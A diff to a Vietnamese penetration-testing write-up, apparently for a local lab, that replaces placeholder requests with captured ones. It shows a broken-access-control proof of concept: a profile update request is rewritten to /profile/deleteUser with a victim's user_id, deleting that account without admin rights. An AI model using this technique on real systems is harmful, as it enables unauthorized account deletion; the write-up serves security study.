@@ -159,25 +159,47 @@ $user = $stmt->fetch();
 
 **Yêu cầu gốc (Request hợp lệ - cập nhật email):**
 ```
-POST /profile/updateEmail HTTP/1.1
-Host: target-site.com
+POST /web_pen_v1/profile/updateEmail HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Origin: http://localhost
+Connection: keep-alive
+Referer: http://localhost/web_pen_v1/profile
+Cookie: PHPSESSID=bbq2e7f3trj6afj73sq4jru0t5
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
 
-email=hacker@evil.com
+csrf_token=&email=son%40testa01.com
 ```
 #### 📌 4. Chỉnh sửa request:
 -Đổi URL /profile/updateEmail thành /profile/deleteUser.
--Thêm tham số user_id với giá trị ID của nạn nhân (ví dụ: 1 là admin).
-Yêu cầu đã chỉnh sửa (Request tấn công - xóa user ID 1):
+-Thêm tham số user_id với giá trị ID của nạn nhân (ví dụ: 6 là neovim).
+Yêu cầu đã chỉnh sửa (Request tấn công - xóa user ID 6):
 ```
-POST /profile/deleteUser HTTP/1.1
-Host: target-site.com
+POST /web_pen_v1/profile/deleteUser HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+Origin: http://localhost
+Connection: keep-alive
+Referer: http://localhost/web_pen_v1/profile
+Cookie: PHPSESSID=bbq2e7f3trj6afj73sq4jru0t5
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
 
-user_id=1
+user_id=6
 ```
 #### ✅ 5. Gửi request.
-- Nếu lỗ hổng tồn tại, tài khoản có id=1 sẽ bị xóa mà không cần quyền admin.
+- Nếu lỗ hổng tồn tại, tài khoản có id=6 sẽ bị xóa mà không cần quyền admin.
 - Nếu admin bị xóa, hệ thống có thể bị vô hiệu hóa hoặc rơi vào trạng thái không thể quản lý.
 - 📸 Ảnh Chụp Màn Hình (PoC Visuals)
 	
